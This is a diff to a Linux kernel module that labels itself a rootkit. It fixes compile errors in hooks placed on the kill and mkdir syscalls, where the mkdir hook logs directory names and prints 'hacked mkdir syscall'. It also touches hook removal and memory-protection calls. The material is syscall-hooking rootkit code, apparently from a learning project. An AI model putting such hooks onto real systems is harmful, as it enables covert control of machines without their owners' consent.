@@ -62,16 +62,16 @@ static asmlinkage long hook_kill(const struct pt_regs *regs){
 
 static asmlinkage int hook_mkdir(const struct pt_regs *regs){
     char __user *pathname = (char *)regs->di;
-    char dirname[NAME_MAX] = {0};
+    char dir_name[NAME_MAX] = {0};
 
-    long error strncpy_from_user(dir_name, pathname, NAME_MAX);
+    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);
 
     if(error > 0){
         printk(KERN_INFO "rootkit: trying to create directory with name : %s\n", dir_name);
     }
     printk(KERN_INFO "***** hacked mkdir syscall *****\n");
 
-    orig_mkdir(pathname, mode);
+    orig_mkdir(regs);
     return 0;
 }
 
@@ -92,9 +92,9 @@ static asmlinkage long hook_kill(pid_t pid, int sig){
 
 static asmlinkage int hook_mkdir(const char __user *pathname, umode_t mode){
 
-    char dirname[NAME_MAX] = {0};
+    char dir_name[NAME_MAX] = {0};
 
-    long error strncpy_from_user(dir_name, pathname, NAME_MAX);
+    long error =  strncpy_from_user(dir_name, pathname, NAME_MAX);
 
     if(error > 0){
         printk(KERN_INFO "rootkit: trying to create directory with name : %s\n", dir_name);
@@ -102,7 +102,7 @@ static asmlinkage int hook_mkdir(const char __user *pathname, umode_t mode){
     printk(KERN_INFO "***** hacked mkdir syscall *****\n");
 
     orig_mkdir(pathname, mode);
-    return 0;3
+    return 0;
 }
 #endif
 
@@ -236,7 +236,7 @@ static void __exit exit_func(void){
 
     unprotect_memory();
 
-    err = fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
+    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
 
     // if(cleanup() == err){
     //     printk(KERN_INFO "error: clean up error\n");
